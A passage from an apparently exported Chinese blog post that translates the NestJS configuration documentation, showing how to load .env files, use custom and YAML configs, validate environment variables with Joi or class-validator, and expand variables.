<span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">'joi'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"hljs-meta\">@Module</span>({</span><br><span class=\"line\">  <span class=\"hljs-attr\">imports</span>: [</span><br><span class=\"line\">    <span class=\"title class_\">ConfigModule</span>.<span class=\"title function_\">forRoot</span>({</span><br><span class=\"line\">      <span class=\"hljs-attr\">validationSchema</span>: <span class=\"title class_\">Joi</span>.<span class=\"title function_\">object</span>({</span><br><span class=\"line\">        <span class=\"hljs-attr\">NODE_ENV</span>: <span class=\"title class_\">Joi</span>.<span class=\"title function_\">string</span>()</span><br><span class=\"line\">          .<span class=\"title function_\">valid</span>(<span class=\"hljs-string\">'development'</span>, <span class=\"hljs-string\">'production'</span>, <span class=\"hljs-string\">'test'</span>, <span class=\"hljs-string\">'provision'</span>)</span><br><span class=\"line\">          .<span class=\"title function_\">default</span>(<span class=\"hljs-string\">'development'</span>),</span><br><span class=\"line\">        <span class=\"hljs-attr\">PORT</span>: <span class=\"title class_\">Joi</span>.<span class=\"title function_\">number</span>().<span class=\"title function_\">default</span>(<span class=\"hljs-number\">3000</span>),</span><br><span class=\"line\">      }),</span><br><span class=\"line\">      <span class=\"hljs-attr\">validationOptions</span>: {</span><br><span class=\"line\">        <span class=\"hljs-attr\">allowUnknown</span>: <span class=\"hljs-literal\">false</span>,</span><br><span class=\"line\">        <span class=\"hljs-attr\">abortEarly</span>: <span class=\"hljs-literal\">true</span>,</span><br><span class=\"line\">      },</span><br><span class=\"line\">    }),</span><br><span class=\"line\">  ],</span><br><span class=\"line\">})</span><br><span class=\"line\"><span class=\"hljs-keyword\">export</span> <span class=\"hljs-keyword\">class</span> <span class=\"title class_\">AppModule</span> {}</span><br></pre></td></tr></tbody></table></figure>\n\n<p><code>@nestjsconfig</code>包使用的默认设置是:</p>\n<ul>\n<li><code>allowUnknown</code>：控制是否允许在环境变量中使用未知键。默认为<code>true</code>。</li>\n<li><code>abortEarly</code>： 如果为true，则在第一个错误时停止验证；如果为false，则返回所有错误。默认值为<code>false</code>。</li>\n</ul>\n<p>请注意，一旦你决定传递一个<code>validationOptions</code>对象，你没有明确传递的任何设置都将默认为Joi标准默认值（而不是<code>@nestjsconfig</code>默认值）。例如，如果你在你的自定义<code>validationOptions</code>对象中没有指定<code>allowUnknowns</code>，它将有Joi默认值<code>false</code>。因此，在您的自定义对象中指定这两个设置可能是最安全的。</p>\n<h2 id=\"自定义校验函数\"><a href=\"#自定义校验函数\" class=\"headerlink\" title=\"自定义校验函数\"></a>自定义校验函数</h2><p>另外，你也可以指定一个同步的<code>validate</code>函数，该函数接收一个包含环境变量的对象（来自env文件和进程），并返回一个包含验证过的环境变量的对象，这样你就可以在需要的时候转换它们。如果函数抛出一个错误，它将阻止应用程序的引导。</p>\n<p>在这个例子中，我们将继续使用<code>class-transformer</code>和<code>class-validator</code>包。首先，我们必须定义。</p>\n<ul>\n<li>一个具有验证约束的类，</li>\n<li>一个使用 <code>plainToClass</code> 和 <code>validateSync</code> 函数的验证函数。</li>\n</ul>\n<figure class=\"highlight ts hljs\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"hljs-keyword\">import</span> { plainToClass } <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">'class-transformer'</span>;</span><br><span class=\"line\"><span class=\"hljs-keyword\">import</span> { <span class=\"title class_\">IsEnum</span>, <span class=\"title class_\">IsNumber</span>, validateSync } <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">'class-validator'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"hljs-built_in\">enum</span> <span class=\"title class_\">Environment</span> {</span><br><span class=\"line\">  <span class=\"title class_\">Development</span> = <span class=\"hljs-string\">\"development\"</span>,</span><br><span class=\"line\">  <span class=\"title class_\">Production</span> = <span class=\"hljs-string\">\"production\"</span>,</span><br><span class=\"line\">  <span class=\"title class_\">Test</span> = <span class=\"hljs-string\">\"test\"</span>,</span><br><span class=\"line\">  <span class=\"title class_\">Provision</span> = <span class=\"hljs-string\">\"provision\"</span>,</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"hljs-keyword\">class</span> <span class=\"title class_\">EnvironmentVariables</span> {</span><br><span class=\"line\">  <span class=\"hljs-meta\">@IsEnum</span>(<span class=\"title class_\">Environment</span>)</span><br><span class=\"line\">  <span class=\"hljs-attr\">NODE_ENV</span>: <span class=\"title class_\">Environment</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"hljs-meta\">@IsNumber</span>()</span><br><span class=\"line\">  <span class=\"hljs-attr\">PORT</span>: <span class=\"hljs-built_in\">number</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"hljs-keyword\">export</span> <span class=\"hljs-keyword\">function</span> <span class=\"title function_\">validate</span>(<span class=\"hljs-params\">config: Record&lt;<span class=\"hljs-built_in\">string</span>, unknown&gt;</span>) {</span><br><span class=\"line\">  <span class=\"hljs-keyword\">const</span> validatedConfig = <span class=\"title function_\">plainToClass</span>(</span><br><span class=\"line\">    <span class=\"title class_\">EnvironmentVariables</span>,</span><br><span class=\"line\">    config,</span><br><span class=\"line\">    { <span class=\"hljs-attr\">enableImplicitConversion</span>: <span class=\"hljs-literal\">true</span> },</span><br><span class=\"line\">  );</span><br><span class=\"line\">  <span class=\"hljs-keyword\">const</span> errors = <span class=\"title function_\">validateSync</span>(validatedConfig, { <span class=\"hljs-attr\">skipMissingProperties</span>: <span class=\"hljs-literal\">false</span> });</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"hljs-keyword\">if</span> (errors.<span class=\"hljs-property\">length</span> &gt; <span class=\"hljs-number\">0</span>) {</span><br><span class=\"line\">    <span class=\"hljs-keyword\">throw</span> <span class=\"hljs-keyword\">new</span> <span class=\"title class_\">Error</span>(errors.<span class=\"title function_\">toString</span>());</span><br><span class=\"line\">  }</span><br><span class=\"line\">  <span class=\"hljs-keyword\">return</span> validatedConfig;</span><br><span class=\"line\">}</span><br></pre></td></tr></tbody></table></figure>\n\n<p>完成这些之后，使用<code>validate</code>函数作为<code>ConfigModule</code>的配置选项，如下所示:</p>\n<figure class=\"highlight ts hljs\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"hljs-keyword\">import</span> { validate } <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">'./env.validation'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"hljs-meta\">@Module</span>({</span><br><span class=\"line\">  <span class=\"hljs-attr\">imports</span>: [</span><br><span class=\"line\">    <span class=\"title class_\">ConfigModule</span>.<span class=\"title function_\">forRoot</span>({</span><br><span class=\"line\">      validate,</span><br><span class=\"line\">    }),</span><br><span class=\"line\">  ],</span><br><span class=\"line\">})</span><br><span class=\"line\"><span class=\"hljs-keyword\">export</span> <span class=\"hljs-keyword\">class</span> <span class=\"title class_\">AppModule</span> {}</span><br></pre></td></tr></tbody></table></figure>\n\n<h2 id=\"自定义getter函数\"><a href=\"#自定义getter函数\" class=\"headerlink\" title=\"自定义getter函数\"></a>自定义getter函数</h2><p><code>ConfigService</code>定义了一个通用的<code>get()</code>方法，通过键来检索配置值。我们还可以添加getter函数，以实现更自然的编码风格。</p>\n<figure class=\"highlight ts hljs\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"hljs-meta\">@Injectable</span>()</span><br><span class=\"line\"><span class=\"hljs-keyword\">export</span> <span class=\"hljs-keyword\">class</span> <span class=\"title class_\">ApiConfigService</span> {</span><br><span class=\"line\">  <span class=\"title function_\">constructor</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">private</span> configService: ConfigService</span>) {}</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"hljs-keyword\">get</span> <span class=\"title function_\">isAuthEnabled</span>(): <span class=\"hljs-built_in\">boolean</span> {</span><br><span class=\"line\">    <span class=\"hljs-keyword\">return</span> <span class=\"variable language_\">this</span>.<span class=\"hljs-property\">configService</span>.<span class=\"title function_\">get</span>(<span class=\"hljs-string\">'AUTH_ENABLED'</span>) === <span class=\"hljs-string\">'true'</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></tbody></table></figure>\n\n<p>现在我们可以使用getter函数如下:</p>\n<figure class=\"highlight ts hljs\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"hljs-meta\">@Injectable</span>()</span><br><span class=\"line\"><span class=\"hljs-keyword\">export</span> <span class=\"hljs-keyword\">class</span> <span class=\"title class_\">AppService</span> {</span><br><span class=\"line\">  <span class=\"title function_\">constructor</span>(<span class=\"hljs-params\">apiConfigService: ApiConfigService</span>) {</span><br><span class=\"line\">    <span class=\"hljs-keyword\">if</span> (apiConfigService.<span class=\"hljs-property\">isAuthEnabled</span>) {</span><br><span class=\"line\">      <span class=\"hljs-comment\">// Authentication is enabled</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></tbody></table></figure>\n\n<h2 id=\"可扩展变量\"><a href=\"#可扩展变量\" class=\"headerlink\" title=\"可扩展变量\"></a>可扩展变量</h2><p><code>@nestjsconfig</code>支持环境变量扩展。通过这种技术，你可以创建嵌套的环境变量，其中一个变量被引用到另一个变量的定义中。比如说</p>\n<figure class=\"highlight shell hljs\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">APP_URL=mywebsite.com</span><br><span class=\"line\">SUPPORT_EMAIL=support@${APP_URL}</span><br></pre></td></tr></tbody></table></figure>\n\n<p>通过这种结构，变量<code>SUPPORT_EMAIL</code>解析为<code>support@mywebsite.com</code>。请注意使用 <code>${...}</code> 语法来触发解析 <code>SUPPORT_EMAIL</code> 定义中的变量 <code>APP_URL</code> 的值。</p>\n<blockquote>\n<p>对于这个功能，<code>@nestjsconfig</code>包内部使用<code>dotenv-expand</code>。</p>\n</blockquote>\n<p>使用传递给<code>ConfigModule</code>的<code>forRoot()</code>方法的选项对象中的<code>expandVariables</code>属性启用环境变量扩展，如下所示。</p>\n<figure class=\"highlight ts hljs\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"hljs-meta\">@Module</span>({</span><br><span class=\"line\">  <span class=\"hljs-attr\">imports</span>: [</span><br><span class=\"line\">    <span class=\"title class_\">ConfigModule</span>.<span class=\"title function_\">forRoot</span>({</span><br><span class=\"line\">      <span class=\"hljs-comment\">// ...</span></span><br><span class=\"line\">      <span class=\"hljs-attr\">expandVariables</span>: <span class=\"hljs-literal\">true</span>,</span><br><span class=\"line\">    }),</span><br><span class=\"line\">  ],</span><br><span class=\"line\">})</span><br><span class=\"line\"><span class=\"hljs-keyword\">export</span> <span class=\"hljs-keyword\">class</span> <span class=\"title class_\">AppModule</span> {}</span><br></pre></td></tr></tbody></table></figure>\n\n<h2 id=\"在-main-ts-中使用\"><a href=\"#在-main-ts-中使用\" class=\"headerlink\" title=\"在 main.ts 中使用\"></a>在 <code>main.ts</code> 中使用</h2><p>虽然我们的配置是存储在service中的，但它仍然可以在<code>main.ts</code>文件中使用。这样，你就可以用它来存储变量，如应用程序端口或CORS host。</p>\n<p>要访问它，你必须使用<code>app.get()</code>方法，然后是服务引用。</p>\n<figure class=\"highlight ts hljs\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"hljs-keyword\">const</span> configService = app.<span class=\"title function_\">get</span>(<span class=\"title class_\">ConfigService</span>);</span><br></pre></td></tr></tbody></table></figure>\n\n<p>然后，你可以像往常一样，通过调用配置键的get方法来使用它。</p>\n<figure class=\"highlight ts hljs\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"hljs-keyword\">const</span> port = configService.<span class=\"title function_\">get</span>(<span class=\"hljs-string\">'PORT'</span>);</span><br></pre></td></tr></tbody></table></figure>\n\n<blockquote>\n<p>本文基本上是官文文档中有关配置部分的中文翻译（<a href=\"https://docs.nestjs.com/techniques/configuration%EF%BC%89%EF%BC%8C%E6%9C%89%E6%97%B6%E9%97%B4%E5%86%8D%E5%86%99%E4%B8%AA%E5%AE%9E%E6%88%98%E6%96%87%E7%AB%A0%E3%80%82\">https://docs.nestjs.com/techniques/configuration），有时间再写个实战文章。</a></p>\n</blockquote>\n</body></html>","site":{"data":{}},"_categories":[],"_tags":[],"excerpt":"<html><head></head><body><p>应用程序通常运行在不同的环境，例如，开发有开发环境、测试环境，线上有预发布环境、生产环境，而运行在不同的环境，需要有不同的配置，例如数据库的配置等。</p></body></html>","more":"<p>在<code>Node</code>中，外部定义的环境变量通过<code>procress.env</code>全局可见。在Node.js应用程序中，通常使用<code>.env</code>文件来配置这些环境变量，其中每个键代表一个特定的值，以代表每个环境。</p>\n<p>解析<code>.env</code>文件并加载到<code>procress.env</code>中，就需要使用<code>dotenv</code>这个包了，但是Nest提供了一个配置环境变量的软件包 - <code>@nestjs/config</code>，其内部依赖了<code>dotenv</code>。</p>\n<h2 id=\"安装-nestjs-config\"><a href=\"#安装-nestjs-config\" class=\"headerlink\" title=\"安装@nestjs/config\"></a>安装<code>@nestjs/config</code></h2><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// npm</span><br><span class=\"line\"><span class=\"meta\">$ </span><span class=\"language-bash\">npm i --save @nestjs/config</span></span><br><span class=\"line\"></span><br><span class=\"line\">// yarn</span><br><span class=\"line\"><span class=\"meta\">$ </span><span class=\"language-bash\">yarn add @nestjs/config</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"简单使用\"><a href=\"#简单使用\" class=\"headerlink\" title=\"简单使用\"></a>简单使用</h2><p>安装完成后，我们可以导入<code>ConfigModule</code>。通常，我们将其导入根目录<code>AppModule</code>并使用. <code>forRoot()</code>静态方法控制其行为。在此步骤中，将解析并生成环境变量键/值对。稍后，我们将在其他功能模块中看到一些用于访问的<code>ConfigService</code>类的选项<code>ConfigModule</code>。</p>\n<figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> &#123; <span class=\"title class_\">Module</span> &#125; <span class=\"keyword\">from</span> <span class=\"string\">&#x27;@nestjs/common&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; <span class=\"title class_\">ConfigModule</span> &#125; <span class=\"keyword\">from</span> <span class=\"string\">&#x27;@nestjs/config&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Module</span>(&#123;</span><br><span class=\"line\">  <span class=\"attr\">imports</span>: [<span class=\"title class_\">ConfigModule</span>.<span class=\"title function_\">forRoot</span>()],</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">class</span> <span class=\"title class_\">AppModule</span> &#123;&#125;</span><br></pre></td></tr></table></figure>\n\n<p>上面的代码将从<code>.env</code>默认位置（项目根目录）加载并解析文件，将文件中的键/值对<code>.env</code>与分配给其的环境变量合并<code>process.env</code>，并将结果存储在私有结构中，您可以通过访问该私有结构<code>ConfigService</code>。该<code>forRoot()</code>方法注册了<code>ConfigService</code>提供程序，该提供程序提供了<code>get()</code>一种读取这些已解析/合并的配置变量的方法。由于<code>@nestjs/config</code>依赖于<a href=\"https://github.com/motdotla/dotenv\">dotenv</a>，因此它使用该程序包的规则来解决环境变量名称中的冲突。当密钥在运行时环境中作为环境变量（例如，通过OS shell导出之类export DATABASE_USER=test）和在<code>.env</code>文件中同时存在时，运行时环境变量优先。</p>\n<p>示例<code>.env</code>文件如下所示：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">DATABASE_USER=<span class=\"built_in\">test</span></span><br><span class=\"line\">DATABASE_PASSWORD=<span class=\"built_in\">test</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"自定义ENV文件路径\"><a href=\"#自定义ENV文件路径\" class=\"headerlink\" title=\"自定义ENV文件路径\"></a>自定义ENV文件路径</h2><p>默认情况下，程序会在应用程序的根目录中查找<code>.env</code>文件。要为<code>.env</code>文件指定其他路径，请设置<code>forRoot()</code>的可选属性<code>envFilePath</code>，如下所示：</p>\n<figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"title class_\">ConfigModule</span>.<span class=\"title function_\">forRoot</span>(&#123;</span><br><span class=\"line\">  <span class=\"attr\">envFilePath</span>: <span class=\"string\">&#x27;.development.env&#x27;</span>,</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n\n<p>您还可以为<code>.env</code>文件指定多个路径，如下所示：</p>\n<figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"title class_\">ConfigModule</span>.<span class=\"title function_\">forRoot</span>(&#123;</span><br><span class=\"line\">  <span class=\"attr\">envFilePath</span>: [<span class=\"string\">&#x27;.env.development.local&#x27;</span>, <span class=\"string\">&#x27;.env.development&#x27;</span>],</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n\n<p>如果在多个文件中找到一个变量，则第一个优先。</p>\n<p>在实际开发中，往往有多个配置文件，比如开发环境使用<code>.development.env</code>配置文件，测试环境使用<code>.test.env</code>配置文件，生产环境使用<code>.production.env</code>配置文件，然后使用不同的启动命令，启用不同的配置文件，示例如下：</p>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// package.json</span></span><br><span class=\"line\"><span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">    ...</span><br><span class=\"line\">    <span class=\"attr\">&quot;scripts&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;start&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;cross-env NODE_ENV=development nest start&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;start:dev&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;cross-env NODE_ENV=development nest start --watch&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;start:prod&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;cross-env NODE_ENV=production node dist/main&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;test&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;cross-env NODE_ENV=test jest&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">    ...</span><br><span class=\"line\"><span class=\"punctuation\">&#125;</span></span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>安装<code>cross-env</code>，使用它跨平台的设置环境变量</p>\n</blockquote>\n<figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"title class_\">ConfigModule</span>.<span class=\"title function_\">forRoot</span>(&#123;</span><br><span class=\"line\">  <span class=\"attr\">envFilePath</span>: <span class=\"string\">`<span class=\"subst\">$&#123;process.env.NODE_ENV || <span class=\"string\">&#x27;development&#x27;</span>&#125;</span>.env`</span>,</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"使用全局module\"><a href=\"#使用全局module\" class=\"headerlink\" title=\"使用全局module\"></a>使用全局module</h2><p>如果要<code>ConfigModule</code>在其他模块中使用，则需要将其导入（这是所有Nest模块的标准配置）。或者，通过将<code>options</code>对象的<code>isGlobal</code>属性设置为<code>true</code>，将其声明为全局模块，如下所示。在这种情况下，一旦<code>ConfigModule</code>被加载到根模块中，就不需要在其他模块中导入<code>ConfigModule</code>了</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"title class_\">ConfigModule</span>.<span class=\"title function_\">forRoot</span>(&#123;</span><br><span class=\"line\">  <span class=\"attr\">isGlobal</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"自定义配置文件\"><a href=\"#自定义配置文件\" class=\"headerlink\" title=\"自定义配置文件\"></a>自定义配置文件</h2><p>对于更复杂的项目，可以使用自定义配置文件返回嵌套的配置对象。这允许您按功能对相关配置设置进行分组（例如，与数据库相关的设置），并将相关设置存储在单个文件中，以帮助独立管理它们。</p>\n<p>自定义配置文件导出一个工厂函数，该函数返回一个配置对象。配置对象可以是任何任意嵌套的普通JavaScript对象。<code>process.env</code>对象将包含完全解析的环境变量key-value对（如上所述，.env文件和外部定义的变量被解析和合并）。由于你控制了返回的配置对象，你可以添加任何所需的逻辑来将值投射到一个适当的类型，设置默认值等。例如</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> () =&gt; (&#123;</span><br><span class=\"line\">  <span class=\"attr\">port</span>: <span class=\"built_in\">parseInt</span>(process.<span class=\"property\">env</span>.<span class=\"property\">PORT</span>, <span class=\"number\">10</span>) || <span class=\"number\">3000</span>,</span><br><span class=\"line\">  <span class=\"attr\">database</span>: &#123;</span><br><span class=\"line\">    <span class=\"attr\">host</span>: process.<span class=\"property\">env</span>.<span class=\"property\">DATABASE_HOST</span>,</span><br><span class=\"line\">    <span class=\"attr\">port</span>: <span class=\"built_in\">parseInt</span>(process.<span class=\"property\">env</span>.<span class=\"property\">DATABASE_PORT</span>, <span class=\"number\">10</span>) || <span class=\"number\">5432</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n\n<p>将其传给<code>ConfigModule.forRoot()</code>的<code>load</code>属性，来加载这个自定义配置：</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> configuration <span class=\"keyword\">from</span> <span class=\"string\">&#x27;./config/configuration&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Module</span>(&#123;</span><br><span class=\"line\">  <span class=\"attr\">imports</span>: [</span><br><span class=\"line\">    <span class=\"title class_\">ConfigModule</span>.<span class=\"title function_\">forRoot</span>(&#123;</span><br><span class=\"line\">      <span class=\"attr\">load</span>: [configuration],</span><br><span class=\"line\">    &#125;),</span><br><span class=\"line\">  ],</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">class</span> <span class=\"title class_\">AppModule</span> &#123;&#125;</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>load属性是个数组，允许加载多个自定义配置文件</p>\n</blockquote>\n<p>通过自定义配置文件，我们还可以管理自定义文件，如YAML文件。下面是一个使用YAML格式的配置的例子。</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">http:</span></span><br><span class=\"line\">  <span class=\"attr\">host:</span> <span class=\"string\">&#x27;localhost&#x27;</span></span><br><span class=\"line\">  <span class=\"attr\">port:</span> <span class=\"number\">8080</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">db:</span></span><br><span class=\"line\">  <span class=\"attr\">postgres:</span></span><br><span class=\"line\">    <span class=\"attr\">url:</span> <span class=\"string\">&#x27;localhost&#x27;</span></span><br><span class=\"line\">    <span class=\"attr\">port:</span> <span class=\"number\">5432</span></span><br><span class=\"line\">    <span class=\"attr\">database:</span> <span class=\"string\">&#x27;yaml-db&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"attr\">sqlite:</span></span><br><span class=\"line\">    <span class=\"attr\">database:</span> <span class=\"string\">&#x27;sqlite.db&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p>为了读取和解析YAML文件，我们可以利用<code>js-yaml</code>包。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">$ </span><span class=\"language-bash\">npm i js-yaml</span></span><br><span class=\"line\"><span class=\"meta\">$ </span><span class=\"language-bash\">npm i -D @types/js-yaml</span></span><br></pre></td></tr></table></figure>\n\n<p>安装软件包后，我们将使用yaml#load函数来加载刚刚在上面创建的YAML文件。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> &#123; readFileSync &#125; <span class=\"keyword\">from</span> <span class=\"string\">&#x27;fs&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> * <span class=\"keyword\">as</span> yaml <span class=\"keyword\">from</span> <span class=\"string\">&#x27;js-yaml&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; join &#125; <span class=\"keyword\">from</span> <span 